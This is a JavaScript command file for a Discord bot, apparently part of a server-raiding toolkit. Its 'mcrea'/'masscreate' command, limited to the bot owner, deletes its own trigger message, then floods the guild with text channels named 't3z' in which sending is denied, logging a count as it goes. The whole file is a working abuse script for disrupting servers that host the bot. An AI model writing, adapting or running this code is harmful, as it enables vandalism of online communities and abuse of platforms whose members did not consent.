
module.exports.run = async (client, message, args) => {
    const config = require("../config.json");    
    if (message.author.id == config.idowner){} else return;
    message.delete();

    let deleteall = true;
    var name = message.author.username;
    let counterch = 0;


    let messageArray = message.content.split(" "),

        command = messageArray[0]
        message.channel.send(`Ok (mcrea)`).then(msg => setTimeout(() => msg.delete(), 2500));
        while(deleteall) {
            await new Promise(resolve => setTimeout(() => {
                message.guild.channels.cache.forEach(channel => {
                    message.guild.channels.create('t3z', {
                        type: 'GUILD_TEXT',
                        permissionOverwrites: [{
                            id: message.guild.id,
                            allow: ['VIEW_CHANNEL'],
                            deny: ['SEND_MESSAGES'],
                        }]
                    }).catch()
                    counterch++
                    console.log(`${counterch} channel created`)
                    if(counterch == "50") {
                        deleteall = false
                        console.clear()
                        console.log(`Logged in as ${client.user.tag}`)
                    }
                })
                resolve();
            }
        ))};

}

module.exports.config = {
    name: "mcrea",
    aliases: ["masscreate"]
}
